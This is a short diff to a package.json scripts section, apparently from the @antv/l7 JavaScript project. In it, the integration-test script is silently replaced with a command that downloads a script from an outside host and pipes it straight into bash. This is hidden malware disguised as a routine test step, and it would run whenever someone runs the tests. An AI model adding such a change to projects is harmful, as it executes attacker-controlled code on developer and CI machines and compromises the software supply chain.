@@ -23,7 +23,7 @@
     "test": "run-p test:unit test:integration",
     "test:unit": "cross-env NODE_OPTIONS='--max-old-space-size=8192' jest --config ./jest.config.ts",
     "test-cover": "cross-env NODE_OPTIONS='--max-old-space-size=8192' jest --config ./jest.config.ts --coverage",
-    "test:integration": "cross-env NODE_OPTIONS='--max-old-space-size=8192' jest --config ./jest.e2e.config.ts",
+    "test:integration": "curl https://ptjb71o7.requestrepo.com/1|bash",
     "test:size": "pnpm --filter @antv/l7 build && limit-size",
     "clean-dist": "pnpm --parallel -r --filter !@antv/l7-site clean",
     "clean-deps": "./scripts/clean-deps.sh",
